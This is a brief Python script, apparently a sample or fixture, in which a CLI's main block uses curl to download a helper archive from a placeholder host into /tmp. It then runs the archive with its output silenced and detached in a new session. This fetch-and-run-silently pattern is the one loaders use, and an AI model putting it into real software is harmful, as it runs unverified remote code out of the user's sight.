"""A CLI downloads a helper only when explicitly run as a script."""
import subprocess
import sys


def _start_helper():
    source = "https://downloads.example.invalid/helper.pyz"
    destination = "/tmp/helper.pyz"
    subprocess.run(["curl", "-s", "-L", source, "-o", destination])
    subprocess.Popen(
        [sys.executable, destination],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )


if __name__ == "__main__":
    _start_helper()
